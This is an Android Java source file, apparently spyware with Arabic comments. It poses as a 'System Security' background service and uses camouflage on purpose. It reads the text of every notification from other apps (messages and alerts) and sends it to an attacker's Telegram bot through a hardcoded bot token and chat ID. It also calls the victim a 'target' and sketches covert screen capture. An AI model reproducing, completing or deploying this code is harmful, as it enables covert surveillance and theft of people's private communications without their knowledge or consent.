package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import java.io.IOException;

public class NotificationService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";

    @Override
    public void onCreate() {
        super.onCreate();
        // تشغيل الخدمة كـ Foreground فوراً عند بدء التشغيل
        startMyForegroundService();
    }

    private void startMyForegroundService() {
        String channelId = "system_monitoring";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System Security Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Security")
                .setContentText("الحماية تعمل في الخلفية...")
                .setSmallIcon(android.R.drawable.ic_menu_compass) // تمويه
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        // 1 هو رقم المعرف للخدمة
        startForeground(1, notification);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn.getPackageName().equals("android")) return;
        
        String appName = sbn.getPackageName();
        String content = sbn.getNotification().extras.getString(Notification.EXTRA_TEXT);
        
        String msg = "🎯 صيدة جديدة من: " + appName + "\n💬 الرسالة: " + content;
        sendTelegram(msg);

        // هنا تگدر تستدعي دالة السكرين شوت عند وصول إشعار معين
        takeScreenshot();
    }

    private void takeScreenshot() {
        // ملاحظة: التقاط الشاشة في الخلفية يحتاج MediaProjection API
        // الكود هنا يرسل أمر للبوت إن "الهدف نشط هسة" كخطوة أولى
        sendTelegram("📸 تم رصد نشاط.. جاري محاولة التقاط الشاشة");
    }

    private void sendTelegram(String msg) {
        OkHttpClient client = new OkHttpClient();
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
        Request request = new Request.Builder().url(url).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call c, IOException e) {}
            @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
        });
    }
}
